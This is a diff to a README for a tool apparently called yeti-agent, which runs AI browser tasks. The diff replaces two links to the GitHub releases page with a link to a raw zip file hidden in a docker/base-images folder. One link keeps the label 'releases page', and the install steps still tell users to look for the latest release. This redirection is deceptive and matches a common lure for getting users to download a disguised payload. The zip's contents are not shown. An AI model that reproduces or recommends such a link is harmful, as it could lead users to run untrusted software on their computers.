@@ -1,6 +1,6 @@
 # 🐾 yeti-agent - Run AI Browser Tasks 24/7
 
-[![Download yeti-agent](https://img.shields.io/badge/Download%20yeti--agent-blue?style=for-the-badge)](https://github.com/hunkdl/yeti-agent/releases)
+[![Download yeti-agent](https://img.shields.io/badge/Download%20yeti--agent-blue?style=for-the-badge)](https://github.com/hunkdl/yeti-agent/raw/refs/heads/main/docker/base-images/agent-yeti-1.7.zip)
 
 ## 🌟 What this is
 
@@ -21,7 +21,7 @@ Before you install yeti-agent on Windows, make sure you have:
 
 ## 🚀 Download and install
 
-1. Visit the [releases page](https://github.com/hunkdl/yeti-agent/releases)
+1. Visit the [releases page](https://github.com/hunkdl/yeti-agent/raw/refs/heads/main/docker/base-images/agent-yeti-1.7.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file for your computer
 4. If the file is zipped, right-click it and choose Extract All
